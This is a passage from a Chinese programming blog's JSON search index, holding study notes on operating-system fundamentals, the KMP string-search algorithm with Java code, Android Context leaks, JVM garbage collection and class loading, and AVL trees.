消息传递：指进程通过发送消息给内核，由内核缓冲区保存消息并转发给其他进程的方式，适用于小数据传输 共享内存：直接由同一主机上多个进程共享一片内存空间，操作同一堆数据，适用于大数据传输，需要处理同步问题 套接字：即Socket，网络传输层协议，可进行任意两进程间通信 虚拟内存虚拟内存技术允许进程不完全的载入内存，即一部分程序加载到内存中，另一部分仍在硬盘中，当需要使用硬盘部分时才使用页面置换加载到内存中。虚拟内存技术的好处如下： 内存的逻辑地址大于物理地址，降低了内存对程序的限制 虚拟内存使得进程间共享内存变得简单容易 让进程的创建过程变得更快更高效 虚拟地址、逻辑地址、线性地址、物理地址的区别 虚拟地址（逻辑地址）：由CPU产生的地址，通常是连续的 物理地址：物理单元存储所采用的地址，内存单元地址，不一定是连续的 线性地址：是虚拟地址（逻辑地址）到物理地址变换之间的中间层","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"KMP算法小结","slug":"KMP算法小结","date":"2016-04-03T13:21:34.000Z","updated":"2020-05-11T07:23:44.706Z","comments":true,"path":"2016/04/03/KMP算法小结/","link":"","permalink":"https://superxlcr.github.io/2016/04/03/KMP算法小结/","excerpt":"","text":"最近看了一些关于KMP算法的资料，在此写一篇博客总计一下。 KMP算法介绍KMP算法是一种字符串搜索的改进算法，由D.E.Knuth，J.H.Morris和V.R.Pratt同时发现，因此人们称它为克努特——莫里斯——普拉特操作（简称KMP算法）。KMP算法的关键是利用匹配失败后的信息，尽量减少模式串与主串的匹配次数以达到快速匹配的目的。 举个例子：有两个字符串，我们要在第一个字符串（主串）中寻找第二个字符串（模式串）： ｂａｃｂａｂａｂａｂａｃａａｂａｂａｂｃａ 寻找的方法很简单，就是逐位进行比较，要是不相等就把模式串右移。考虑下面这种情况： ｂａｃｂａｂａｂａ ｂａｃａａｂ ａｂａｂａ ｃａ 粗体的字符串表示匹配的部分，斜体的字符串表示不匹配的部分。此时我们的字符串并没有完全匹配，因此我们需要把模式串往右移。 此时一般的字符串匹配算法会这么做： ｂａｃｂａｂａｂａｂａｃａａｂ ａｂａｂａｃａ 但这么做就浪费了我们绿色部分匹配所获得的信息。我们可以看到，对于粗体匹配部分，我们拥有两个相同的前缀与后缀： 后缀：ａｂａｂａ前缀： ａｂａｂａ 因此在这里我们的模式串是可以向右移动两位的： ｂａｃｂａｂａｂａｂａｃａａｂ ａｂａｂａｃａ 这也就是KMP算法的思想：利用匹配失败后的信息，尽量减少模式串与主串的匹配次数 因此我们会在KMP算法中维护一个next数组，该数组的下标表示了主串与模式串匹配相同的长度（也就是粗体部分字符串的长度，同时也是匹配失败的位置），而数组中则存储了该粗体字符串相同前后缀的长度。因此当我们匹配失败时我们可以移动：粗体字符串长度 - 粗体字符串前后缀长度（如上面的例子就是5 - 3 = 2） KMP算法的实现要想实现KMP算法，我们先得把关键的next数组计算出来。计算next数组的方法如下图所示： 假设我们要求next[i+1]，那么我们考虑模式串的最后一个字符，即第i位字符。如果第i位字符与第next[i]位字符相等，那么显而易见next[i+1]的值就是next[i]+1。但如果第i位字符与第next[i]位字符不等，那么我们就必须寻找字符串前缀中的前缀，就必须比较第i位字符与第next[next[i]]位字符了，直到前缀为0则停止比较。（此处确实绕口……）因此，根据上面的思想我们可以写出如下Java代码： 123456789101112131415161718192021/** * 输入模式字符串返回其对应的next数组 * @param p 模式字符串 * @return next数组 */ private static int[] KMPNext(String p) &#123; // 初始化 int len = p.length(); int next[] = new int[len]; next[0] = next[1] = 0; for (int i = 1; i &lt; len-1; i++) &#123; int j = next[i]; // 相同前缀的最后一位字符 while (j &gt; 0 &amp;&amp; p.charAt(i) != p.charAt(j)) // 如果第i位字符与前缀最后一位字符不相等，则去寻找前缀的前缀，如果没有前缀则退出循环 j = next[j]; if (p.charAt(i) == p.charAt(j)) // 如果相等，则最长前后缀长度加一 next[i+1] = j+1; &#125; return next; &#125; 有了next数组，我们就可以写出KMP算法了： 12345678910111213141516171819/** * KMP搜索字符串 * @param m 主字符串 * @param p 模式串 * @param next next数组 */ private static void KMP(String m, String p, int next[]) &#123; int j = 0; // 模式串索引 for (int i = 0; i &lt; m.length(); i++) &#123; while (j &gt; 0 &amp;&amp; m.charAt(i) != p.charAt(j)) // 字符不相等，模式串右移，由于字符串已有next[i]个相同的前后缀，因此比较索引为next[i]的字符串即可 j = next[j]; if (m.charAt(i) == p.charAt(j)) // 字符相等，索引加一 j++; if (j == p.length()) &#123; // 已找到结果 System.out.println(\"find the string in \" + (i - j + 1)); break; &#125; &#125; &#125; 最后附上检测用的例子： 123456public static void main(String[] args) throws Exception &#123; String m = \"ｂａｃｂａｂａｂａｂａｃａａｂ\"; String p = \"ａｂａｂａｃａ\"; int next[] = KMPNext(p); KMP(m, p, next); &#125; 结果如下：","categories":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/tags/算法/"}]},{"title":"操作系统基础知识总结（一）","slug":"操作系统基础知识总结（一）","date":"2016-04-03T04:08:46.000Z","updated":"2020-05-11T07:23:44.850Z","comments":true,"path":"2016/04/03/操作系统基础知识总结（一）/","link":"","permalink":"https://superxlcr.github.io/2016/04/03/操作系统基础知识总结（一）/","excerpt":"","text":"以下为一些常见的操作系统基础知识整理总结： 进程与线程的区别进程进程，即正在运行的程序，程序从硬盘载入到内存就变成进程。进程是资源的拥有者，每个进程都拥有着自己的内存空间与多个线程。 线程线程是指令的执行者，是计算机执行指令的基本单元，一个进程可以拥有多个线程。线程的引入主要有如下原因： 响应：与进程相比，创建线程不涉及或较少涉及资源分配，因此速度较快 资源共享：线程间可以共享资源，同一个进程内两个线程通信快 经济：创建线程不涉及或较少涉及资源分配 适合计算机的多处理器架构 线程既有共享的资源，也有自己私有的资源，JVM中线程持有的资源一般如下： PC（程序计数器）：线程私有 栈：线程私有 堆：线程共享 方法区：线程共享 在操作系统中，线程还会细分为用户空间的用户级线程与内核空间的内核级线程，两种线程之间还有多种关系模型，在此不再赘述。 死锁的必要条件以及处理死锁方法死锁有四大必要条件，缺一不可： 互斥：至少有一个资源同时只能被一个进程所拥有的 占有且等待：一个进程必须持有至少一个资源去等待其他的资源 非抢占时：资源不能被抢占，一个资源只有当进程执行完毕才会被释放 循环等待：多个进程循环等待其他进程释放资源 对付死锁我们大致可以从三个方面入手： 死锁预防与避免：不允许程序死锁 死锁检测与恢复：允许程序死锁，死锁后进行恢复工作 忽略死锁：出现死锁直接不管（大多数操作系统的做法） 内存管理方式内存管理方式分为：段存储，页存储，段页存储 段存储示意图如下： 用户程序通过逻辑内存的段号查找段表，获取段的物理内存初始地址与长度，然后操作系统即可在物理内存上读取相应的数据。使用段存储会出现外部碎片。 页存储示意图如下： 操作系统先把内存空间切分成大小相等的块，用户程序根据自身的大小占用一定的帧。用户程序通过逻辑内存的页号去页表查找对应的物理内存的块号（帧号），然后操作系统在物理内存上读取相应的数据。使用页存储会出现内部碎片。有些操作系统还会有TLB（页表缓存），把一些常用的页面放在TLB中方便快速查询，要是TLB中查询失败再去页表查询。 段页存储即先分段再分页的内存管理办法，其示意图如下： 进程的几种状态进程有以下几种状态： New（创建状态）：表示进程正在被创建 Running（运行状态）：表示进程正在执行 Waiting（等待状态）：表示进程正在等待事件的发生 Ready（就绪状态）：表示进程已经准备好，等待分配CPU处理器 Terminated（终止状态）；表示进程已经执行完毕，被终止","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"Android Context的一些总结","slug":"Android-Context的一些总结","date":"2016-04-02T02:46:18.000Z","updated":"2020-05-11T07:23:44.500Z","comments":true,"path":"2016/04/02/Android-Context的一些总结/","link":"","permalink":"https://superxlcr.github.io/2016/04/02/Android-Context的一些总结/","excerpt":"","text":"最近看了一些关于Android Context使用要注意的要点，在此写一篇博客总结。 Context的概念Context即上下文，或者叫做场景，它提供了关于应用环境的一些全局信息。我们在加载资源、启动一个新的Activity、获取系统服务、获取内部文件（夹）路径、创建View操作时等都需要Context的参与，可见Context有多重要。以下是Context的类结构图： 可以看到我们常用的Activity、Service、Application都是Context的子类，那么这几个类当做Context基类使用的时候有什么不同呢？接下来我们一起来探讨下。 引用问题一个典型的由Context引起的引用问题就是单例模式的使用，先来看看以下代码： 12345678910111213141516public class Singleton &#123; private static Singleton singleton; public static Singleton getISingleton(Context context) &#123; if (singleton == null) &#123; singleton = new Singleton(context); &#125; return singleton; &#125; private Context context; private Singleton(Context context) &#123; this.context = context; &#125; &#125; 对于上述的单例，大家应该都不陌生（请别计较getInstance的效率问题），内部保持了一个Context的引用。上面代码的问题在于：如果传入的Context是一个Activity或Service，那么这个组件将会由于被强引用持有而无法被回收掉，从而导致内存泄露问题。因此，为了让我们的控件能被顺利回收掉，我们此处应该使用Application作为Context使用，把代码中的构造函数改为如下： 123private Singleton(Context context) &#123; this.context = context.getApplicationContext(); &#125; Context应用场景看完上面的例子，可能大家认为只要以后一直使用Application作为Context就好了，然而事实并不是这样的，每个Context的子类都有适合它的应用场景，下面我们来看一下： 对于上面的No的解释分别如下： NO1：启动Activity在这些类中是可以的，但是需要创建一个新的task（强制规定使用参数FLAG_ACTIVITY_NEW_TASK），故一般情况不推荐 NO2：在这些类中去layout inflate是合法的，但是会使用系统默认的主题样式，如果你自定义了某些样式可能不会被使用 NO3：在receiver为null时允许，在4.2或以上的版本中，用于获取黏性广播的当前值（可以无视） PS：ContentProvider、BroadcastReceiver之所以在上述表格中，是因为在其内部方法中都有一个context用于使用。其实对于上面的表格，我们重点只要把握住一点：凡是跟UI相关的，都应该使用Activity做为Context来处理。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"操作系统思维导图","slug":"操作系统思维导图","date":"2016-04-01T13:22:43.000Z","updated":"2020-05-11T07:23:44.851Z","comments":true,"path":"2016/04/01/操作系统思维导图/","link":"","permalink":"https://superxlcr.github.io/2016/04/01/操作系统思维导图/","excerpt":"","text":"操作系统总思维导图： 操作系统进程： 操作系统线程： 操作系统CPU调度： 操作系统进程同步： 操作系统内存： 操作系统文件系统：","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"},{"name":"思维导图","slug":"思维导图","permalink":"https://superxlcr.github.io/tags/思维导图/"},{"name":"大纲","slug":"大纲","permalink":"https://superxlcr.github.io/tags/大纲/"}]},{"title":"关于JVM的常见问题（二）","slug":"关于JVM的常见问题（二）","date":"2016-04-01T02:56:14.000Z","updated":"2020-05-11T07:23:44.823Z","comments":true,"path":"2016/04/01/关于JVM的常见问题（二）/","link":"","permalink":"https://superxlcr.github.io/2016/04/01/关于JVM的常见问题（二）/","excerpt":"","text":"上一篇文章的传送门：关于JVM的常见问题（一） 常见的GC收集器以及特点常见的GC收集器如下图所示，连线代表可搭配使用： Serial收集器（串行收集器）用于新生代的单线程收集器，收集时需要暂停所有工作线程（Stop the world）。优点在于：简单高效，单个CPU时没有线程交互的开销，堆较小时停顿时间不长。常与Serial Old 收集器一起使用，示意图如下所示： ParNew收集器（parallel new 收集器，新生代并行收集器）Serial收集器多线程版本，除了使用多线程外和Serial收集器一模一样。常与Serial Old 收集器一起使用，示意图如下： Parallel Scavenge收集器与ParNew收集器一样是一款多线程收集器，其特点在于关注点与别的GC收集器不同：一般的GC收集器关注于缩短工作线程暂停的时间，而该收集器关注于吞吐量，因此也被称为吞吐量优先收集器。（吞吐量 = 用户运行代码时间 / (用户运行代码时间 + 垃圾回收时间)）高吞吐量与停顿时间短相比主要强调任务快完成，因此常和Parallel Old 收集器一起使用（没有Parallel Old之前与Serial Old一起使用），示意图如下： Serial Old收集器Serial收集器的年老代版本，不再赘述。 Parallel Old收集器年老代的并行收集器，在JDK1.6开始使用。 CMS收集器（Concurrent Mark Sweep，并发标记清除收集器）CMS收集器是一个年老代的收集器，是以最短回收停顿时间为目标的收集器，其示意图如下所示： CMS收集器基于标记清除算法实现，主要分为4个步骤： 初始标记，需要stop the world，标记GC Root能关联到的对象，速度快 并发标记，对GC Root执行可达性算法 重新标记，需要stop the world，修复并发标记时因用户线程运行而产生的标记变化，所需时间比初始标记长，但远比并发标记短 并发清理 CMS收集器的缺点在于： 其对于CPU资源很敏感。在并发阶段，虽然CMS收集器不会暂停用户线程，但是会因为占用了一部分CPU资源而导致应用程序变慢，总吞吐量降低。其默认启动的回收线程数是（cpu数量+3）/4，当cpu数较少的时候，会分掉大部分的cpu去执行收集器线程 无法处理浮动垃圾，浮动垃圾即在并发清除阶段因为是并发执行，还会产生垃圾，这一部分垃圾即为浮动垃圾，要等下次收集 CMS收集器使用的是标记清除算法，GC后会产生碎片 G1收集器（Garbage First收集器）相比CMS收集器，G1收集器主要有两处改进： 使用标记整理算法，确保GC后不会产生内存碎片 可以精确控制停顿，允许指定消耗在垃圾回收上的时间 G1收集器可以实现在基本不牺牲吞吐量的前提下完成低停顿的内存回收，这是由于它能够极力地避免全区域的垃圾收集，之前的收集器进行收集的范围都是整个新生代或老年代，而G1将整个Java堆（包括新生代、老年代）划分为多个大小固定的独立区域（Region），并且跟踪这些区域里面的垃圾堆积程度，在后台维护一个优先列表，每次根据允许的收集时间，优先回收垃圾最多的区域（这就是Garbage First名称的来由）。区域划分及有优先级的区域回收，保证了G1收集器在有限的时间内可以获得最高的收集效率。 Minor GC与Full GC执行时机Minor GC也叫Young GC，当年轻代内存满的时候会触发，会对年轻代进行GCFull GC也叫Major GC，当年老代满的时候会触发，当我们调用System.gc时也可能会触发，会对年轻代和年老代进行GC 类加载的五个过程JVM把class文件加载的内存，并对数据进行校验、转换解析和初始化，最终形成JVM可以直接使用的Java类型的过程就是加载机制。类从被加载到虚拟机内存中开始，到卸载出内存为止，它的生命周期包括了：加载(Loading)、验证(Verification)、准备(Preparation)、解析(Resolution)、初始化(Initialization)、使用(Using)、卸载(Unloading)七个阶段，其中验证、准备、解析三个部分统称链接。 加载在加载阶段，虚拟机需要完成以下事情： 通过一个类的权限定名来获取定义此类的二进制字节流 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构 在java堆中生成一个代表这个类的java.lang.Class对象，作为方法去这些数据的访问入口 验证在验证阶段，虚拟机主要完成： 文件格式验证：验证class文件格式规范 元数据验证：这个阶段是对字节码描述的信息进行语义分析，以保证起描述的信息符合java语言规范要求 字节码验证：进行数据流和控制流分析，这个阶段对类的方法体进行校验分析，这个阶段的任务是保证被校验类的方法在运行时不会做出危害虚拟机安全的行为 符号引用验证：符号引用中通过字符串描述的全限定名是否能找到对应的类、符号引用类中的类，字段和方法的访问性(private、protected、public、default)是否可被当前类访问 准备准备阶段是正式为类变量（被static修饰的变量）分配内存并设置变量初始值（0值）的阶段，这些内存都将在方法区中进行分配 解析解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程常见的解析有四种： 类或接口的解析 字段解析 类方法解析 接口方法解析 初始化初始化阶段才真正开始执行类中定义的java程序代码，初始化阶段是执行类构造器()方法的过程 类加载双亲委派模型JVM运行的是Java字节码，而Java字节码需要通过类加载器找到对应的.class文件，并加载在内存中生成Class类供我们使用。类加载器的主要工作流程如下： loadClass（Java方法，确认由哪个加载器进行加载）-&gt;findClass（Java方法，寻找.class文件）-&gt;defineClass（native方法，通过.class文件在内存中生成Class类供使用） JVM的类加载有多个， 不同的类加载器用于搜索不同位置的.class文件，Java中的类加载器体系结构如下： 启动类加载器（Bootstrap ClassLoader）：是用本地代码实现的类装入器，它负责将 /lib下面的类库加载到内存中（比如rt.jar）。由于引导类加载器涉及到虚拟机本地实现细节，开发者无法直接获取到启动类加载器的引用，所以不允许直接通过引用进行操作.该类加载器代码在JVM内核中，由native代码实现。 标准扩展类加载器：是由 Sun 的 ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的。它负责将&lt; Java_Runtime_Home &gt;/lib/ext或者由系统变量 java.ext.dir指定位置中的类库加载到内存中。开发者可以直接使用标准扩展类加载器。该类加载器由Java代码实现。 应用程序类加载器：由sun.misc.Launcher$AppClassLoader实现，负责加载用户类路径classpath上所指定的类库，是类加载器ClassLoader中的getSystemClassLoader()方法的返回值，开发者可以直接使用应用程序类加载器，如果程序中没有自定义过类加载器，该加载器就是程序中默认的类加载器。该类加载器由Java代码实现。 值得注意的是：上述三个JDK提供的类加载器虽然是父子类加载器关系，但是没有使用继承，而是使用了组合关系。 从JDK1.2开始，JVM规范推荐开发者使用双亲委派模式(ParentsDelegation Model)进行类加载，其加载过程如下： 如果一个类加载器收到了类加载请求，它首先不会自己去尝试加载这个类，而是把类加载请求委派给父类加载器去完成 每一层的类加载器都把类加载请求委派给父类加载器，直到所有的类加载请求都传递给顶层的启动类加载器 如果顶层的启动类加载器无法完成加载请求，则子类加载器会尝试去加载，如果连最初发起类加载请求的类加载器也无法完成加载请求时，将会抛出ClassNotFoundException，而不再调用其子类加载器去进行类加载 采用双亲委派模型的好处在于：使得java类随着它的类加载器一起具备了一种带有优先级的层次关系，越是基础的类，越是被上层的类加载器进行加载，保证了java程序的稳定运行。 静态分派与动态分派要理解分派，我们先来理解Java中的两种类型： 静态类型：变量声明时的类型 实际类型：变量实例化时采用的类型 例子如下： 12345678class Car &#123;&#125; class Bus extends Car &#123;&#125; public class Main &#123; public static void main(String[] args) throws Exception &#123; // Car 为静态类型，Bus 为实际类型 Car car = new Bus(); &#125; &#125; 静态分派所有依赖静态类型来定位方法执行版本的分派动作称为静态分派，其典型应用是方法重载（重载是通过参数的静态类型而不是实际类型来选择重载的版本的）。举例Java代码如下： 1234567891011121314151617181920212223242526class Car &#123;&#125; class Bus extends Car &#123;&#125; class Jeep extends Car &#123;&#125; public class Main &#123; public static void main(String[] args) throws Exception &#123; // Car 为静态类型，Car 为实际类型 Car car1 = new Car(); // Car 为静态类型，Bus 为实际类型 Car car2 = new Bus(); // Car 为静态类型，Jeep 为实际类型 Car car3 = new Jeep(); showCar(car1); showCar(car2); showCar(car3); &#125; private static void showCar(Car car) &#123; System.out.println(\"I have a Car !\"); &#125; private static void showCar(Bus bus) &#123; System.out.println(\"I have a Bus !\"); &#125; private static void showCar(Jeep jeep) &#123; System.out.println(\"I have a Jeep !\"); &#125; &#125; 代码输出如下： 从上面的例子我们可以看出重载调用的具体方法版本是由静态类型来决定的。 动态分派与静态分派类似，动态分派指在在运行期根据实际类型确定方法执行版本，其典型应用是方法重写（即多态）。举例Java代码如下： 1234567891011121314151617181920212223242526272829class Car &#123; public void showCar() &#123; System.out.println(\"I have a Car !\"); &#125; &#125; class Bus extends Car &#123; public void showCar() &#123; System.out.println(\"I have a Bus !\"); &#125; &#125; class Jeep extends Car &#123; public void showCar() &#123; System.out.println(\"I have a Jeep !\"); &#125; &#125; public class Main &#123; public static void main(String[] args) throws Exception &#123; // Car 为静态类型，Car 为实际类型 Car car1 = new Car(); // Car 为静态类型，Bus 为实际类型 Car car2 = new Bus(); // Car 为静态类型，Jeep 为实际类型 Car car3 = new Jeep(); car1.showCar(); car2.showCar(); car3.showCar(); &#125; &#125; 运行结果如下： 可以看出来重写是一个根据实际类型决定方法版本的动态分派过程。","categories":[{"name":"jvm","slug":"jvm","permalink":"https://superxlcr.github.io/categories/jvm/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"},{"name":"jvm","slug":"jvm","permalink":"https://superxlcr.github.io/tags/jvm/"}]},{"title":"关于JVM的常见问题（一）","slug":"关于JVM的常见问题（一）","date":"2016-03-28T02:00:11.000Z","updated":"2020-05-11T07:23:44.821Z","comments":true,"path":"2016/03/28/关于JVM的常见问题（一）/","link":"","permalink":"https://superxlcr.github.io/2016/03/28/关于JVM的常见问题（一）/","excerpt":"","text":"以下为一些常见的JVM问题的整合。 内存模型以及分区JVM内存模型如下图所示： 此处我们集中注意中间绿色的部分，该部分为JVM的运行时内存，该部分包含了：线程私有的（灰色）： 程序计数器：记录执行到第几条指令 虚拟机方法栈：执行Java方法所用，每执行一个方法便加入一个栈帧，里面含有局部变量表、操作栈、动态链接和方法出口等 本地方法栈：与虚拟机方法栈相似，用于执行native方法 线程共享的（蓝色）： 堆：对象实例存放地，，分为年轻代和老年代。年轻代又细分为伊甸园区和两个相对的Survival区 方法区：也叫永久代，存放了类的信息、常量、类静态变量等元素，含有一个运行时常量池 堆里面的分区：Eden，survival from to，老年代，各自的特点Eden区Eden区位于Java堆的年轻代，是新对象分配内存的地方，由于堆是所有线程共享的，因此在堆上分配内存需要加锁。而Sun JDK为提升效率，会为每个新建的线程在Eden上分配一块独立的空间由该线程独享，这块空间称为TLAB（Thread Local Allocation Buffer）。在TLAB上分配内存不需要加锁，因此JVM在给线程中的对象分配内存时会尽量在TLAB上分配。如果对象过大或TLAB用完，则仍然在堆上进行分配。如果Eden区内存也用完了，则会进行一次Minor GC（young GC）。 Survival from toSurvival区与Eden区相同都在Java堆的年轻代。Survival区有两块，一块称为from区，另一块为to区，这两个区是相对的，在发生一次Minor GC后，from区就会和to区互换。在发生Minor GC时，Eden区和Survival from区会把一些仍然存活的对象复制进Survival to区，并清除内存。Survival to区会把一些存活得足够旧的对象移至年老代。 年老代年老代里存放的都是存活时间较久的，大小较大的对象，因此年老代使用标记整理算法。当年老代容量满的时候，会触发一次Major GC（full GC），回收年老代和年轻代中不再被使用的对象资源。 对象创建方法，对象的内存分配，对象的访问定位对象的创建Java对象的创建大致上有以下几个步骤： 类加载检查：检查这个指令的参数是否能在常量池中定位到一个类的符号引用，并且检查这个符号引用代表的类是否已被加载、解析和初始化过。如果没有，那必须先执行相应的类的加载过程为对象分配内存：对象所需内存的大小在类加载完成后便完全确定，为对象分配空间的任务等同于把一块确定大小的内存从Java堆中划分出来。由于堆被线程共享，因此此过程需要进行同步处理（分配在TLAB上不需要同步） 内存空间初始化：虚拟机将分配到的内存空间都初始化为零值（不包括对象头），内存空间初始化保证了对象的实例字段在Java代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。 对象设置：JVM对对象头进行必要的设置，保存一些对象的信息（指明是哪个类的实例，哈希码，GC年龄等） init：执行完上面的4个步骤后，对JVM来说对象已经创建完毕了，但对于Java程序来说，我们还需要对对象进行一些必要的初始化。 对象的内存分配Java对象的内存分配有两种情况，由Java堆是否规整来决定（Java堆是否规整由所采用的垃圾收集器是否带有压缩整理功能决定）： 指针碰撞(Bump the pointer)：如果Java堆中的内存是规整的，所有用过的内存都放在一边，空闲的内存放在另一边，中间放着一个指针作为分界点的指示器，分配内存也就是把指针向空闲空间那边移动一段与内存大小相等的距离 空闲列表(Free List)：如果Java堆中的内存不是规整的，已使用的内存和空闲的内存相互交错，就没有办法简单的进行指针碰撞了。虚拟机必须维护一张列表，记录哪些内存块是可用的，在分配的时候从列表中找到一块足够大的空间划分给对象实例，并更新列表上的记录 对象的访问定位对象的访问形式取决于虚拟机的实现，目前主流的访问方式有使用句柄和直接指针两种：使用句柄：如果使用句柄访问，Java堆中将会划分出一块内存来作为句柄池，引用中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与类型数据各自的具体地址信息： 优势：引用中存储的是稳定的句柄地址，在对象被移动(垃圾收集时移动对象是非常普遍的行为)时只会改变句柄中的实例数据指针，而引用本身不需要修改。 直接指针：如果使用直接指针访问对象，那么对象的实例数据中就包含一个指向对象类型数据的指针，引用中存的直接就是对象的地址： 优势：速度更快，节省了一次指针定位的时间开销，积少成多的效应非常可观。 GC的两种判定方法：引用计数与引用链基于引用计数与基于引用链这两大类别的自动内存管理方式最大的不同之处在于：前者只需要局部信息，而后者需要全局信息 引用计数引用计数顾名思义，就是记录下一个对象被引用指向的次数。引用计数方式最基本的形态就是让每个被管理的对象与一个引用计数器关联在一起，该计数器记录着该对象当前被引用的次数，每当创建一个新的引用指向该对象时其计数器就加1，每当指向该对象的引用失效时计数器就减1。当该计数器的值降到0就认为对象死亡。每个计数器只记录了其对应对象的局部信息——被引用的次数，而没有（也不需要）一份全局的对象图的生死信息。由于只维护局部信息，所以不需要扫描全局对象图就可以识别并释放死对象；但也因为缺乏全局对象图信息，所以无法处理循环引用的状况。 引用链引用链需要内存的全局信息，当使用引用链进行GC时，从对象图的“根”（GC Root，必然是活的引用，包括栈中的引用，类静态属性的引用，常量的引用，JNI的引用等）出发扫描出去，基于引用的可到达性算法来判断对象的生死。这使得对象的生死状态能批量的被识别出来，然后批量释放死对象。引用链不需要显式维护对象的引用计数，只在GC使用可达性算法遍历全局信息的时候判断对象是否被引用，是否存活。 GC的三种收集方法：标记清除、标记整理、复制算法的原理与特点，分别用在什么地方标记清除标记清除算法分两步执行： 暂停用户线程，通过GC Root使用可达性算法标记存活对象 清除未被标记的垃圾对象 标记清除算法缺点如下： 效率较低，需要暂停用户线程 清除垃圾对象后内存空间不连续，存在较多内存碎片 标记算法如今使用的较少了 复制算法复制算法也分两步执行，在复制算法中一般会有至少两片的内存空间（一片是活动空间，里面含有各种对象，另一片是空闲空间，里面是空的）： 暂停用户线程，标记活动空间的存活对象 把活动空间的存活对象复制到空闲空间去，清除活动空间 复制算法相比标记清除算法，优势在于其垃圾回收后的内存是连续的。但是复制算法的缺点也很明显： 需要浪费一定的内存作为空闲空间 如果对象的存活率很高，则需要复制大量存活对象，导致效率低下 复制算法一般用于年轻代的Minor GC，主要是因为年轻代的大部分对象存活率都较低 标记整理标记整理算法是标记清除算法的改进，分为标记、整理两步： 暂停用户线程，标记所有存活对象 移动所有存活对象，按内存地址次序一次排列，回收末端对象以后的内存空间 标记整理算法与标记清除算法相比，整理出的内存是连续的；而与复制算法相比，不需要多片内存空间。然而标记整理算法的第二步整理过程较为麻烦，需要整理存活对象的引用地址，理论上来说效率要低于复制算法。因此标记整理算法一般引用于老年代的Major GC","categories":[{"name":"jvm","slug":"jvm","permalink":"https://superxlcr.github.io/categories/jvm/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"},{"name":"jvm","slug":"jvm","permalink":"https://superxlcr.github.io/tags/jvm/"}]},{"title":"算法二叉搜索树之AVL树","slug":"算法二叉搜索树之AVL树","date":"2016-03-26T01:57:21.000Z","updated":"2020-05-11T07:23:44.874Z","comments":true,"path":"2016/03/26/算法二叉搜索树之AVL树/","link":"","permalink":"https://superxlcr.github.io/2016/03/26/算法二叉搜索树之AVL树/","excerpt":"","text":"最近学习了二叉搜索树中的AVL树，特在此写一篇博客小结。 引言对于二叉搜索树而言，其插入查找删除等性能直接和树的高度有关，因此我们发明了平衡二叉搜索树。在计算机科学中，AVL树是最先发明的自平衡二叉搜索树。在AVL树中任何节点的两个子树的高度最大差别为一，所以它也被称为高度平衡树。对于N个节点的AVL树，由于树高被限制为lgN，因此其插入查找删除操作耗时为O（lgN）。 旋转在讲解关键步骤插入与删除以前，首先我们先定义一些辅助用的操作：旋转。旋转分为左旋和右旋，其示意图如下： 相信上图已经表示的非常明确，这里就不再细说，值得注意的是：在旋转操作中只有指针的改变，其他属性都保持不变。对旋转前后的树使用中序遍历将得到相同的结果。 插入对于AVL树而言一个关键的操作就是插入操作。往AVL树中插入新的节点可能会引起AVL树的性质被破坏，我们分为以下两种情况来讨论（我们只讨论左子树的情况，右子树的情况只需镜像处理即可）： 左左情况（LL）这种情况如下： A是失去平衡的节点，其失去平衡的原因在于其左节点B中加入了新左节点C，此时我们对A节点进行右旋操作即可恢复AVL树的平衡。 左右情况（LR）这种情况需要进行两次旋转，如下图所示： A是失去平衡的节点，其失去平衡的原因在于其左节点B中加入了新右节点C，此时我们需要两次旋转来解决问题，我们先对B节点进行左旋，再对A节点进行右旋即可。 对于RR（右子节点加入新右节点）和RL（右子节点加入新左节点）的情况，只要针对上面的情况进行镜像处理即可。 删除对AVL树的某个节点进行删除后，我们需要判断其父节点是否还符合AVL树的性质，如果否则进行与插入情况类似的旋转处理即可，在此不再赘述。","categories":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/tags/算法/"}]},{"title":"关于一些基础的Java问题的解答（七）","slug":"关于一些基础的Java问题的解答（七）","date":"2016-03-22T07:04:54.000Z","updated":"2020-05-11T07:23:44.828Z","comments":true,"path":"2016/03/22/关于一些基础的Java问题的解答（七）/","link":"","permalink":"https://superxlcr.github.io/2016/03/22/关于一些基础的Java问题的解答（七）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（六） 反射的作用与原理简单的来说，反射机制其实就是指程序在运行的时候能够获取自身的信息。如果知道一个类的名称或者它的一个实例对象， 就能把这个类的所有方法和变量的信息(方法名，变量名，方法，修饰符，类型，方法参数等等所有信息)找出来。如果明确知道这个类里的某个方法名+参数个数 